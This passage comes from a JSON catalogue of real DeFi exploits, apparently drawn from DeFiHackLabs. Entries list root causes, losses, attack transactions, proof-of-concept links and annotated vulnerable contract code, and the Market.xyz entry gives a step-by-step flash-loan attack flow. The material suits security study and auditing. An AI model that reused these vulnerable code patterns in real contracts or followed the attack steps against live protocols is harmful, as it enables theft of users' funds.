        "vulnerable_code_snippet": "function _deposit(\n    uint256 assets,\n    address receiver,\n    bytes calldata data,\n    uint256 nav\n) private returns (uint256 shares) {\n    ...\n    if (BASIS_POINT_MAX > invariant) {\n        swapAmount = assetsToToken1(assets);\n        returnAmount = userSwap(\n            data,\n            address(this),\n            swapAmount,\n            address(asset),\n            address(other)\n        ); // Re-enter deposit()\n    }\n\n    uint256 supply = totalSupply(); // Mint share before totalSupply update via reentrancy\n    if (0 < supply) {\n        shares = INITIAL_SHARE;\n        uint256 feeAmount = shares.mulDiv(entryFee, BASIS_POINT_MAX, MathUpgradeable.Rounding.Down);\n        _mint(receiver, shares - feeAmount);\n        _mint(owner(), feeAmount); // mint(feeTo)\n    } else {\n        ...\n    }\n}"
    },
    {
        "type": "Insufficient validation, Oracle",
        "date": "20230202",
        "title": "BonqDAO",
        "root_cause": "Price Oracle manipulation due to incorrect integration of the Tellor Oracle.",
        "lost": "$88M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/BonqDAO_exp.sol",
        "vulnerable_code_snippet": "function submitValue(\n        bytes32 _queryId,\n        bytes calldata _value,\n        uint256 _nonce,\n        bytes calldata _queryData\n    ) external {\n        require(keccak256(_value) != keccak256(\"\"), \"value must be submitted\");\n        Report storage _report = reports[_queryId];\n        require(\n            _nonce == _report.timestamps.length || _nonce == 0,\n            \"nonce must match timestamp index\"\n        );\n        StakeInfo storage _staker = stakerDetails[msg.sender];\n        require(\n            _staker.stakedBalance >= stakeAmount, // Its checks if the staker balance is more than stakeAmount i.e. 10 TRB\n            \"balance must be greater than stake amount\"\n        );\n\n        require(\n            (block.timestamp - _staker.reporterLastTimestamp) * 1000 >\n                (reportingLock * 1000) / (_staker.stakedBalance / stakeAmount),\n            \"still in reporter time lock, please wait!\"\n        );\n\n        _report.timestampIndex[block.timestamp] = _report.timestamps.length;\n        _report.timestamps.push(block.timestamp);\n        _report.timestampToBlockNum[block.timestamp] = block.number;\n        _report.valueByTimestamp[block.timestamp] = _value; // Vulnerable Point: The value is assigned here. Anyone who has staked 10TRB can submit the balance.\n        _report.reporterByTimestamp[block.timestamp] = msg.sender;\n        // Disperse Time Based Reward\n        uint256 _reward = ((block.timestamp - timeOfLastNewValue) * timeBasedReward) / 300; //.5 TRB per 5 minutes\n    }",
        "attack_tx": [
            "0x31957ecc43774d19f54d9968e95c69c882468b46860f921668f2c55fadd51b19",
            "0xa02d0c3d16d6ee0e0b6a42c3cc91997c2b40c87d777136dedebe8ee0f47f32b1"
        ],
        "analysis": [
            "https://quillaudits.medium.com/decoding-bonq-daos-120-million-exploit-quillaudits-bd8e50eec4ac",
            "https://twitter.com/BlockSecTeam/status/1621043757390123008"
        ]
    },
    {
        "type": "Business Logic Flaw, Sandwich",
        "date": "20240522",
        "title": "Burner",
        "root_cause": "Incorrect logic so sandwich.",
        "attack_tx": "https://app.blocksec.com/explorer/tx/eth/0x3bba4fb6de00dd38df3ad68e51c19fe575a95a296e0632028f101c5199b6f71",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/Burner_exp.sol",
        "analysis": "https://medium.com/@daleewong/burner-exploit-analysis-0733a69ddc27",
        "lost": "1.7 eth",
        "vulnerable_code_snippet": "function burn() public {\n    require(!paused, 'cannot burn when paused');\n    uint total = token.balanceOf(address(this));\n    uint toBurn = total.mul(percentageToBurn).div(100);\n    token.burn(toBurn, '');\n    uint notBurned = token.balanceOf(address(this));\n    require(token.transfer(unburnedDestination, notBurned), 'cannot transfer unburned tokens');\n    emit Burn(toBurn, notBurned);\n}\n\nfunction convertAndBurn(address[] calldata tokens) external {\n    for (uint i = 0; i < tokens.length; i++) {\n        _convert(tokens[i]);\n    }\n    burn();\n}\n\nfunction _convert(address srcToken) internal {\n    uint srcAmount;\n    uint converted;\n    if (srcToken == ETHER || srcToken == address(0)) {\n        srcAmount = address(this).balance;\n        converted = kyberNetwork.trade\n            .value(srcAmount)(ETHER, srcAmount, address(token), address(uint160(address(this))), BIG_LIMIT, 1, kyberFeeWallet); // <-- vulnerable point\n    } else {\n        srcAmount = IERC20(srcToken).balanceOf(address(this));\n        if (IERC20(srcToken).allowance(address(this), address(kyberNetwork)) > 0) {\n            IERC20(srcToken).safeApprove(address(kyberNetwork), 0);\n        }\n        IERC20(srcToken).safeApprove(address(kyberNetwork), srcAmount);\n        converted = kyberNetwork.trade(srcToken, srcAmount, address(token), address(uint160(address(this))), BIG_LIMIT, 1, kyberFeeWallet);\n    }\n    emit TokenTrade(srcToken, srcAmount, converted);\n}"
    },
    {
        "type": "Flashloans, Reentrancy",
        "date": "20221024",
        "lost": "$220k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/past/2022#20221024-market---read-only-reentrancy",
        "title": "Market",
        "root_cause": "Market.xyz had been utilizing the Curve LP Oracle for their lending and borrowing markets. However, a price manipulation vulnerability arose because of the presence of Read-Only Reentrancy in the Curve LP Oracle.",
        "attack_tx": [
            "https://polygonscan.com/tx/0xb8efe839da0c89daa763f39f30577dc21937ae351c6f99336a0017e63d387558",
            "https://polygonscan.com/tx/0x303c770b81d8866693aa341774eaa2cd5dc3a5f1d2ad855b9d6f0c10b5c36d5d"
        ],
        "analysis": "The attack flow as follow:\n1. Execute a flashloan of WMATIC and stMATIC tokens.\n2. Provide liquidity to the WMATIC/stMATIC Curve pool and receive Curve LP tokens.\n3. Utilize a portion of the Curve LP tokens as collateral on [\\\"http://market.xyz\\\"](http://market.xyz/).\n4. **Increase** the collateral's value by removing liquidity from the Curve pool.\n    1. when removing the liquidity, D value remain unchanged but total supply already updated.\n    2. more: [https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/](https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/)\n5. Use the expensive collateral to borrow MAI using a fallback function.\n6. Initiate self-liquidation to acquire the collateral at a discounted price.\n7. Repay the flashloan.",
        "vulnerable_code_snippet": "@external\n@nonreentrant('lock')\ndef remove_liquidity(_amount: uint256, min_amounts: uint256[N_COINS],\n                     use_eth: bool = False, receiver: address = msg.sender):\n    \"\"\"\n    This withdrawal method is very safe, does no complex math\n    \"\"\"\n    lp_token: address = self.token\n    total_supply: uint256 = CurveToken(lp_token).totalSupply()\n    CurveToken(lp_token).burnFrom(msg.sender, _amount)\n    balances: uint256[N_COINS] = self.balances\n    amount: uint256 = _amount - 1  # Make rounding errors favoring other LPs a tiny bit\n\n    for i in range(N_COINS):\n        d_balance: uint256 = balances[i] * amount / total_supply\n        assert d_balance >= min_amounts[i]\n        self.balances[i] = balances[i] - d_balance\n        balances[i] = d_balance  # now it's the amounts going out\n        coin: address = self.coins[i]\n        if use_eth and coin == WETH20:\n            raw_call(receiver, b\"\", value=d_balance)\n        else:\n            if coin == WETH20:\n                WETH(WETH20).deposit(value=d_balance)\n            response: Bytes[32] = raw_call(\n                coin,\n                _abi_encode(receiver, d_balance, method_id=method_id(\"transfer(address,uint256)\")),\n                max_outsize=32,\n            )\n            if len(response) != 0:\n                assert convert(response, bool)\n\n    D: uint256 = self.D\n    self.D = D - D * amount / total_supply\n\n    log RemoveLiquidity(msg.sender, balances, total_supply - _amount)"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240409",
        "title": "UPS",
        "root_cause": "The UPS token was exploited due to a flawed transfer implementation. When tokens are transferred to the Pancake pair, they are burned at the pair and the \"skim\" function is called. This caused the UPS reserve to shrink significantly, allowing the hacker to drain BUSD from the pair using just a few UPS tokens.",
        "attack_tx": "https://app.blocksec.com/explorer/tx/bsc/0xd03702e17171a32464ce748b8797008d59e2dbcecd3b3847d5138414566c886d",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/UPS_exp.sol",
        "analysis": [
            "Root cause:",
            "Vulnerable code snippet:",
            "Attack tx:",
            "Analysis:"
        ],
        "vulnerable_code": "https://bscscan.com/address/0x3da4828640ad831f3301a4597821cc3461b06678",
        "additional_info": [
            "https://x.com/0xNickLFranklin/status/1777589025802449239"
        ],
        "vulnerable_code_snippet": "super._update(from, to, amount);\nelse if (to == pairAddress) { // 交易对地址\n    uint256 fee = amount * 5 / 100;\n    if (!inSwapAndLiquify) {\n        _swapBurn(amount - fee); // Vulnerable Point: potential reentrancy issue\n    }\n    if (nodeList.length > 0) {\n        uint256 every = fee / nodeList.length;\n        for (uint256 i = 0; i < nodeList.length; i++) {\n            super._update(from, nodeList[i], every);\n        }\n    } else {\n        _burn(from, fee);\n    }\n    super._update(from, to, amount - fee);"
    },
    {
        "type": "Business Logic Flaw, Flashloans",
        "date": "20221027",
        "lost": "$50k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/VTF_exp.sol",
        "title": "VTF Token",
        "root_cause": "The function `updateUserBalance` does not ascertain the duration for which a user has retained the token. Exploiting this, the attacker pre-deploys numerous malicious contracts, secures the initial $VTF via a flashloan, and subsequently transfers the VTF tokens to each attack contract sequentially. This maneuver enables the attacker to claim the rewards for holding.",
        "vulnerable_code": "https://bscscan.com/address/0xc6548caf18e20f88cc437a52b6d388b0d54d830d#code",
        "attack_tx": [
            "https://bscscan.com/tx/0xeeaf7e9662a7488ea724223c5156e209b630cdc21c961b85868fe45b64d9b086",
            "https://bscscan.com/tx/0xc2d2d7164a9d3cfce1e1dac7dc328b350c693feb0a492a6989ceca7104eef9b7"
        ],
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1585575129936977920",
            "https://twitter.com/peckshield/status/1585572694241988609",
            "https://twitter.com/BeosinAlert/status/1585587030981218305"
        ],
        "vulnerable_code_snippet": "function updateUserBalance(address _user) public {\n\tuint256 totalAmountOver = super.totalSupply();\n\tif (maxTotal <= totalAmountOver) {\n\t\tmaxCanMint = false;\n\t}\n\n\tif (userBalanceTime[_user] > 0) {\n\t\tuint256 canMint = getUserCanMint(_user);\n\t\tif (canMint > 0) {\n\t\t\tuserBalanceTime[_user] = block.timestamp;\n\t\t\t_mint(_user, canMint);\n\t\t}\n\t} else {\n\t\tuserBalanceTime[_user] = block.timestamp;\n\t}\n}"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240309",
        "title": "Juice",
        "root_cause": "The root cause is in Staking Contract, the `harvest()` mishandling the `rewardPerShare`",
        "attack_tx": "https://etherscan.io/tx/0xc9b2cbc1437bbcd8c328b6d7cdbdae33d7d2a9ef07eca18b4922aac0430991e7",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/Juice_exp.sol",
        "analysis": null,
        "lost": "54 ETH",
        "vulnerable_code_snippet": "function harvest(uint256 stakeCount) external {\n    require(mapStakingInfo[address(msg.sender)][stakeCount].stakedAmount > 0, \"Staking not found\");\n    require(mapStakingInfo[address(msg.sender)][stakeCount].unstakeStatus == 0, \"Staking already unstake\");\n    \n    _updatePool();\n    \n    (uint256 pending, uint256 bonus) = pendingReward(address(msg.sender), stakeCount);\n    IERC20(Juice).safeTransfer(address(msg.sender), (pending + bonus));\n    \n    mapStakingInfo[address(msg.sender)][stakeCount].rewardDebt += pending;\n    emit Harvest(msg.sender, (pending + bonus));\n}\n\nfunction _updatePool() internal {\n    if (block.timestamp <= lastRewardUpdateTime) {\n        return;\n    }\n    if (JuiceStaked == 0) {\n        lastRewardUpdateTime = block.timestamp;\n        return;\n    }\n    uint256 multiplier = _getMultiplier(lastRewardUpdateTime, block.timestamp);\n    uint256 stakingReward = multiplier * rewardPerSecond;\n    rewardPerShare = rewardPerShare + (stakingReward * precisionFactor) / JuiceStaked;\n    lastRewardUpdateTime = block.timestamp;\n}"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20240404",
        "lost": "$18K USD",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/WSM_exp.sol",
        "title": "wsm",
        "root_cause": "Using a flash loan to create a price disparity in the BNB_WSM pool, the attacker then manipulated the price through the `buyWithBNB()` function in the presale contract.",
        "attack_tx": "https://bscscan.com/tx/0x5a475a73343519f899527fdb9850f68f8fc73168073c72a3cff8c0c7b8a1e520",
        "analysis": "None",
        "vulnerable_code_snippet": "function buyWithBNB(uint256 amount, bool _stakeStaus) external payable whenNotPaused nonReentrant returns (bool) {\n    require(dynamicSaleState, 'dynamic sale not active');\n    require(amount <= maxTokensToSell - directTotalTokensSold, 'amount exceeds max tokens to be sold');\n    directTotalTokensSold += amount;\n    uint256 ethAmount = fetchPrice(amount * baseDecimals);\n    require(msg.value >= ethAmount, 'Less payment');\n    uint256 excess = msg.value - ethAmount;\n    sendValue(payable(paymentWallet), ethAmount);\n    if (excess > 0) sendValue(payable(_msgSender()), excess);\n    if (!_stakeStaus) {\n        bool success = IERC20Upgradeable(saleToken).transfer(_msgSender(), (amount * baseDecimals));\n        require(success, 'Token transfer failed');\n        emit TokensBought(_msgSender(), amount, address(0), ethAmount, 0, block.timestamp);\n    } else {\n        stakingManagerInterface.depositByPresale(_msgSender(), amount * baseDecimals);\n        emit TokensBoughtAndStaked(_msgSender(), amount, address(0), ethAmount, 0, block.timestamp);\n    }\n\n    return true;\n}\n\nfunction fetchPrice(uint256 amountOut) public returns (uint256) {\n    bytes memory data = abi.encodeWithSelector(quoter.quoteExactOutputSingle.selector, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x62694D43Ccb9B64e76e38385d15e325c7712A735, 3000, amountOut, 0);\n    (bool success, bytes memory result) = address(quoter).call(data);\n    require(success, 'Call to Quoter failed');\n    uint256 amountIn = abi.decode(result, (uint256));\n    return amountIn + ((amountIn * percent) / 100);\n}"
    },
    {
        "type": "Misconfiguration",
        "date": "20230112",
        "lost": "$90k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/UFDao_exp.sol",
        "title": "UFDao",
        "root_cause": "It's due to the incorrect parameter setting. The attacker bought a public offer of the UF Dao with 1:1 rate using USDC, then redeemed almost all in UF Dao.",
        "attack_tx": "https://bscscan.com/tx/0x933d19d7d822e84e34ca47ac733226367fbee0d9c0c89d88d431c4f99629d77a",
        "analysis": "https://twitter.com/BlockSecTeam/status/1613507804412940289",
        "vulnerable_code_snippet": "function buyPublicOffer(address _dao, uint256 _lpAmount)\n        external\n        nonReentrant\n        returns (bool) {\n        require(\n            IFactory(factory).containsDao(_dao),\n            \"Shop: only DAO can sell LPs\"\n        );\n\n        PublicOffer memory publicOffer = publicOffers[_dao]; // Vulnerable point\n\n        require(publicOffer.isActive, \"Shop: this offer is disabled\");\n\n        IERC20(publicOffer.currency).safeTransferFrom(\n            msg.sender,\n            _dao,\n            (_lpAmount * publicOffer.rate) / 1e18   // Vulnerable point\n        );\n\n        address lp = IDao(_dao).lp();\n\n        bool b = ILP(lp).mint(msg.sender, _lpAmount);\n\n        require(b, \"Shop: mint error\");\n\n        return true;\n    }"
    },
    {
        "type": "Insufficient validation",
        "date": "20231129",
        "title": "AIS",
        "root_cause": "There is no access control in `AIS::setSwapPairs`, allowing the attacker to set pairs to arbitrary addresses. The attacker sets Pancakeswap as a valid pair and transfers tokens to the pair through `AIS::transfer`, subsequently executing the `Pancakeswap::skim` operation to profit.",
        "attack_tx": "https://bscscan.com/tx/0x0be817b6a522a111e06293435c233dab6576d7437d0e148b45efcf7ab8a10de0",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/AIS_exp.sol",
        "analysis": "https://x.com/Phalcon_xyz/status/1729861048004391306/photo/1",
        "vulnerable_code_snippet": "function setSwapPairs(address _address) public { //onlyOwner {\n    Pairs[_address] = true;\n}"
    },
    {
        "type": "ERC20, Flashloans",
        "date": "20221001",
        "title": "RL Token",
        "root_cause": "Incorrect Reward calculation",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221001-RL-Token---Incorrect-Reward-calculation",
        "attack_tx": null,
        "analysis": "Vulnerable code snippet:\n\n[https://bscscan.com/address/0x4bbfae575dd47bcfd5770ab4bc54eb83db088888#code#F1#L129](https://bscscan.com/address/0x4bbfae575dd47bcfd5770ab4bc54eb83db088888#code#F1#L129)\n\nCustom transferFrom function\n```solidity\nfunction transferFrom( \n        address from, \n        address to, \n        uint256 amount \n    ) public virtual override returns (bool) { \n        if (from != address(pancakeSwapV2Pair) && from != address(pancakeSwapV2Router)) {\n            incentive.distributeAirdrop(from);\n        }\n        if (to != address(pancakeSwapV2Pair) && to != address(pancakeSwapV2Router)) {\n            incentive.distributeAirdrop(to); //trace function\n        }\n        if (msg.sender != address(pancakeSwapV2Pair) && msg.sender != address(pancakeSwapV2Router)) {\n            incentive.distributeAirdrop(msg.sender); //trace function\n        }\n        require(allowance(from, msg.sender) >= amount, \"insufficient allowance\");\n        if (govIDO != address(0)) {\n            if (IKBKGovIDO(govIDO).isPriSaler(from)) {\n                IKBKGovIDO(govIDO).releasePriSale(from);\n            }\n            if (IKBKGovIDO(govIDO).isPriSaler(to)) {\n                IKBKGovIDO(govIDO).releasePriSale(to);\n            }\n        }\n        //sell\n        if (to == address(pancakeSwapV2Pair) && msg.sender == address(pancakeSwapV2Router)) {\n            if (!isCommunityAddress[from]) {\n                uint burnAmt = amount / 100;\n                _burn(from, burnAmt);\n                uint slideAmt = amount * 2 / 100;\n                _transfer(from, slideReceiver, slideAmt);\n                amount -= (burnAmt + slideAmt);\n            }\n        } else {\n            if (!isCommunityAddress[from] && !isCommunityAddress[to]) {\n                uint burnAmt = amount / 100;\n                amount -= burnAmt;\n                _burn(from, burnAmt);\n            }\n        }\n        return super.transferFrom(from, to, amount);\n    }\n```\n\n[https://bscscan.com/address/0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666#code#F1#L49](https://bscscan.com/address/0x335ddcE3f07b0bdaFc03F56c1b30D3b269366666#code#F1#L49)\n\n```solidity\nfunction getUserRewards(address user) public view returns (uint256) {\n        if (block.timestamp < airdropStartTime) {\n            return 0;\n        }\n        (uint256 newIndex,) = getNewIndex();\n        uint256 userIndex = usersIndex[user];\n        if (userIndex >= newIndex || userIndex == 0) {\n            return userUnclaimedRewards[user];\n        } else {\n                // vulnerable point, Incorrect Reward calculation. only check balanceof of user without any requirement.\n            return userUnclaimedRewards[user] + (newIndex - userIndex) * lpToken.balanceOf(user) / PRECISION;\n        }\n    }\n```",
        "fixed": null,
        "vulnerable_code_snippet": "function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        if (from != address(pancakeSwapV2Pair) && from != address(pancakeSwapV2Router)) {\n            incentive.distributeAirdrop(from);\n        }\n        if (to != address(pancakeSwapV2Pair) && to != address(pancakeSwapV2Router)) {\n            incentive.distributeAirdrop(to); // trace function\n        }\n        if (msg.sender != address(pancakeSwapV2Pair) && msg.sender != address(pancakeSwapV2Router)) {\n            incentive.distributeAirdrop(msg.sender); // trace function\n        }\n        require(allowance(from, msg.sender) >= amount, \"insufficient allowance\");\n        if (govIDO != address(0)) {\n            if (IKBKGovIDO(govIDO).isPriSaler(from)) {\n                IKBKGovIDO(govIDO).releasePriSale(from);\n            }\n            if (IKBKGovIDO(govIDO).isPriSaler(to)) {\n                IKBKGovIDO(govIDO).releasePriSale(to);\n            }\n        }\n        // sell\n        if (to == address(pancakeSwapV2Pair) && msg.sender == address(pancakeSwapV2Router)) {\n            if (!isCommunityAddress[from]) {\n                uint burnAmt = amount / 100;\n                _burn(from, burnAmt);\n                uint slideAmt = amount * 2 / 100;\n                _transfer(from, slideReceiver, slideAmt);\n                amount -= (burnAmt + slideAmt);\n            }\n        } else {\n            if (!isCommunityAddress[from] && !isCommunityAddress[to]) {\n                uint burnAmt = amount / 100;\n                amount -= burnAmt;\n                _burn(from, burnAmt);\n            }\n        }\n        return super.transferFrom(from, to, amount);\n    } ...  function distributeAirdrop(address user) public override {\n    if (block.timestamp < airdropStartTime) {\n        return;\n    }\n    updateIndex();\n    uint256 rewards = getUserUnclaimedRewards(user); // vulnerable point\n    usersIndex[user] = globalAirdropInfo.index;\n    if (rewards > 0) {\n        uint256 bal = rewardToken.balanceOf(address(this));\n        if (bal >= rewards) {\n            rewardToken.transfer(user, rewards);\n            userUnclaimedRewards[user] = 0;\n        }\n    }\n}\n\nfunction getUserUnclaimedRewards(address user) public view returns (uint256) {\n    if (block.timestamp < airdropStartTime) {\n        return 0;\n    }\n    (uint256 newIndex,) = getNewIndex();\n    uint256 userIndex = usersIndex[user];\n    if (userIndex >= newIndex || userIndex == 0) {\n        return userUnclaimedRewards[user];\n    } else {\n        // vulnerable point, Incorrect Reward calculation. only check balanceOf of user without any requirement.\n        return userUnclaimedRewards[user] + (newIndex - userIndex) * lpToken.balanceOf(user) / PRECISION;\n    }\n}"    
    },
    {
        "type": "Access Control",
        "date": "20230511",
        "lost": "$95k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/SELLC_exp.sol",
        "title": "SellToken01",
        "root_cause": "In the StakingRewards contract, the listToken[] can be set  in the addLiquidity() function. However, this operation *should*  be restricted to 'OwnerOnly'. By exploiting this vulnerability, a hacker can add their self-created token to listToken and subsequently call the sell function.",
        "attack_tx": "https://bscscan.com/address/0x274b3e185c9c8f4ddef79cb9a8dc0d94f73a7675#code",
        "analysis": "https://twitter.com/AnciliaInc/status/1656341587054702598",
        "vulnerable_code_snippet": "function addLiquidity(address _token, address token1, uint amount1) public {  // @audit: pass in fake _token \n    uint lp = IERC20(_token).totalSupply() * 90 / 100;\n    uint miner = IERC20(_token).totalSupply() * 10 / 100;\n    bool isok = IERC20(_token).transferFrom(msg.sender, address(this), IERC20(_token).totalSupply());\n    isok = IERC20(token1).transferFrom(msg.sender, address(this), amount1);\n    require(isok);\n    IERC20(_token).approve(address(address(IRouters)), 2 ** 256 - 1);\n    IRouters.addLiquidity(_token, token1, lp, amount1, 0, 0, address(this), block.timestamp + 100);\n    address pair = ISwapFactory(IRouters.factory()).getPair(_token, token1);\n    if (pairs(pair).IRouter() == address(0)) {\n        pairs(pair).setIRouter(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B);\n    }\n    if (myReward[_token] == address(0)) {\n        myReward[_token] = token1;\n    }\n    listToken[_token] = true; // vulnerable point\n    users[_token][0x2F98Fa813Ced7Aa9Fd6788aB624b2F3F292B9239].tz += 100 ether;\n}"
    },
    {
        "type": "Flashloans, Insufficient validation, MEV",
        "date": "20221014",
        "title": "MEVBOTa47b",
        "root_cause": "insufficient validation.",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221014-mevbota47b---mevbot-a47b",
        "analysis": "Attacker can input arbritary data combine in userDate.",
        "unverified_contract": "https://etherscan.io/address/0x00000000000a47b1298f18cf67de547bbe0d723f"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20230819",
        "lost": "$18ETH",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/BTC20_exp.sol",
        "title": "BTC20",
        "root_cause": "The vulnerable fetchPrice function calls getAmountsIn on the Uniswap router using the WETH-BTC20 pair, which relies on the pair's reserves. The attacker bought a large amount of BTC20 in the WETH-BTC20 pair to manipulate the price",
        "vulnerable_code": "function fetchPrice(uint256 amountOut) public view returns (uint256) { \n    address[] memory path = new address[](2); \n    path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 \n    path[1] = 0xE86DF1970055e9CaEe93Dae9B7D5fD71595d0e18 \n    uint256[] memory amounts = router.getAmountsIn(amountOut, path); \n    return amount[0] + ((amounts[0] * percent) / 100); \n  }",
        "attack_tx": "https://etherscan.io/tx/0xcdd93e37ba2991ce02d8ca07bf6563bf5cd5ae801cbbce3dd0babb22e30b2dbe",
        "analysis": "https://twitter.com/DecurityHQ/status/1692924369662513472",
        "vulnerable_code_snippet": "function fetchPrice(uint256 amountOut) public view returns (uint256) {\n    address;\n    path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    path[1] = 0xE86DF1970055e9CaEe93Dae9B7D5fD71595d0e18;\n    uint256[] memory amounts = router.getAmountsIn(amountOut, path);\n    return amounts[0] + ((amounts[0] * percent) / 100);\n}"
    },
    {
        "type": "Price Manipulation",
        "date": "20230621",
        "title": "BUNN",
        "root_cause": "Attacker called `deliver` function to shrink `_rTotal` value which increased the BUNN token balance of the Pancake pair and allowed them to perform the swap with 52 BNB profit.",
        "attack_tx": "https://bscscan.com/tx/0x24a68d2a4bbb02f398d3601acfd87b09f543d935fc24862c314aaf64c295acdb",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06//BUNN_exp.sol",
        "analysis": "https://twitter.com/DecurityHQ/status/1671803688996806656",
        "lost": "52BNB",
        "vulnerable_code_snippet": "function deliver(uint256 tAmount) public {\n    address sender = _msgSender();\n    require(!_isExcluded[sender], \"Excluded addresses cannot call this function\");\n    (uint256 rAmount,,,,,) = _getValues(tAmount);\n    _rOwned[sender] = _rOwned[sender].sub(rAmount);\n    _rTotal = _rTotal.sub(rAmount);\n    _tFeeTotal = _tFeeTotal.add(tAmount);\n}"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20240526",
        "lost": "$490K",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/NORMIE_exp.sol",
        "title": "NORMIE",
        "root_cause": "Improper verification mechanism for assigning the \"premarket user\" role. The system only checks if the transfer amount equals the balance of the `teamWalletAddress`, which is public information and easily exploitable.",
        "vulnerable_code": "https://vscode.blockscan.com/base/0x7f12d13b34f5f4f0a9449c16bcd42f0da47af200",
        "attack_tx": "https://app.blocksec.com/explorer/tx/base/0xa618933a0e0ffd0b9f4f0835cc94e523d0941032821692c01aa96cd6f80fc3fd",
        "analysis": "https://extropy-io.medium.com/block-forensics-an-in-depth-analysis-of-the-normie-memecoin-incident-0daf5baed08b",
        "vulnerable_code_snippet": "function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) private returns (bool) {\n        ... // code\n        if (\n            isMarketPair[sender] &&\n            !isExcludedFromFee[recipient] &&\n            premarket_user[recipient] // checks that the recipient is a \"premarket user\"\n        ) {\n            _balances[address(this)] = _balances[address(this)].add(amount); // contract balance is increased\n        }\n        ... // code\n        _balances[sender] = _balances[sender].sub(\n            amount,\n            \"Insufficient Balance\"\n        ); // sender balance decreased\n        uint256 finalAmount = (isExcludedFromFee[sender] ||\n            isExcludedFromFee[recipient])\n            ? amount\n            : takeFee(sender, recipient, amount);\n        if (checkWalletLimit && !isWalletLimitExempt[recipient])\n            require(balanceOf(recipient).add(finalAmount) <= _walletMax);\n        _balances[recipient] = _balances[recipient].add(finalAmount); // recipient balance increased\n        _get_premarket_user(recipient, amount); // <--VUlNERABLE POINT\n        emit Transfer(sender, recipient, finalAmount);\n        return true;\n    }"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20230621",
        "title": "BabyDogeCoin02",
        "lost": "441 BNB",
        "root_cause": "In the process between `swapTokensForEth` and `addLiquidity`, there exists a time window that attackers can exploit to manipulate the market price.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/BabyDogeCoin02_exp.sol",
        "attack_tx": "https://bscscan.com/tx/0xbaf3e4841614eca5480c63662b41cd058ee5c85dc69198b29e7ab63b84bc866c",
        "analysis": "https://x.com/hexagate_/status/1671517819840745475",
        "vulnerable_code_snippet": "function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {\n        // split the contract balance into halves\n        uint256 half = contractTokenBalance.div(2);\n        uint256 otherHalf = contractTokenBalance.sub(half);\n\n        // capture the contract's current ETH balance.\n        // this is so that we can capture exactly the amount of ETH that the\n        // swap creates, and not make the liquidity event include any ETH that\n        // has been manually sent to the contract\n        uint256 initialBalance = address(this).balance;\n\n        // swap tokens for ETH\n        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered\n\n        // how much ETH did we just swap into?\n        uint256 newBalance = address(this).balance.sub(initialBalance);\n\n        // add liquidity to uniswap\n        addLiquidity(otherHalf, newBalance);\n        \n        emit SwapAndLiquify(half, newBalance, otherHalf);\n    }"
    },
    {
        "type": "Business Logic Flaw, Flashloans",
        "date": "20230313",
        "title": "EulerFinance",
        "lost": "$200M(returned)",
        "root_cause": "The primary problem here with Euler was its `donateToReserves()` function. which allows the user to transfer tokens from their own balance to a protocol variable called `assetStorage.reserveBalance.`.This function allowed the attacker to`donate` eDAI to Euler reserves, removing assets from their wallet without removing a corresponding amount of debt. Here borrower minted 195 million e-DAI and 200 million d-DAI tokens. A logical error in the `donateToReserve()` method resulted in the burning of e-DAI tokens but not d-DAI tokens, leading to unbacked `d-DAI` token debt that will never be repaid.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Euler_exp.sol",
        "attack_tx": "https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d",
        "analysis": [
            "https://twitter.com/FrankResearcher/status/1635241475989721089",
            "https://twitter.com/nomorebear/status/1635230621856600064",
            "https://twitter.com/peckshield/status/1635229594596036608",
            "https://twitter.com/BlockSecTeam/status/1635262150624305153",
            "https://twitter.com/SlowMist_Team/status/1635288963580825606",
            "https://euler-xyz.github.io/euler-contracts-upgrade-diffs/eip14/EToken.html"
        ],
